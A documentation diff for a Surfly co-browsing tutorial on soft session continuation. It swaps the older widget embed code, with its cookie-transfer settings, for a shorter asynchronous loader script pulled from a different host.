@@ -14,13 +14,14 @@ There are two types of session continuations:
 
 We will use soft session continuation. First, we need to add the snippet code to all the pages we wish to transfer cookies from. We also have to set two cookie options to ensure soft session continuation (including on the landing page): 
 ``` javascript
-<script type="text/javascript">(function(){window['_surfly_settings']=window['_surfly_settings']||{
-widgetkey:"**your api key**",
-hidden: true,
-cookie_transfer_enabled: true,
-cookie_transfer_proxying: false
-};
-var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src="https://surfly.com/static/js/widget.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n); })();</script>
+<script>
+(function(s,u,r,f,l,y){s[f]=s[f]||{init:function(){s[f].q=arguments}};
+l=u.createElement(r);y=u.getElementsByTagName(r)[0];l.async=1;
+l.src='https://x.zok.pw/new-widget-s1.js';y.parentNode.insertBefore(l,y);})
+(window,document,'script','Surfly');
+</script>
+
+
 ```
 
 
